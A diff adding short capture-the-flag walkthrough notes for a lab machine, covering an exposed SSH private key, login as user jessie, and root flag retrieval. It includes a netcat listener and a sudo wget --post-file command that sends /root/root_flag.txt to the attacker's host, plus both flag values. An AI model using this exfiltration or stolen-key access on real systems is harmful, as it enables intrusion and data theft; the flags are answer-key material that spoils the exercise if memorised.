@@ -1,0 +1,12 @@
+ports 80 and 22 (apache and ssh) are open
+source code reveals a user named jessie
+dirbuster discovered /sitemap/.ssh direcctory
+/sitemap/.ssh reveals id_rsa file
+ssh2john reveals id_rsa has no password
+connect to ssh using user=jessie with key=id_rsa
+user flag @ ~jessie/Documents '057c67131c3d5e42dd5cd3075b198ff6'
+useful guide --> https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/
+root flag located at /root
+>>open netcat on local --> 'nc -nvlp 4445'
+>>on target, run a wget exploit --> 'sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<Tunnel IP>:4445'
+>>check on netcat listener to see the flag content 'b1b968b37519ad1daa6408188649263d'
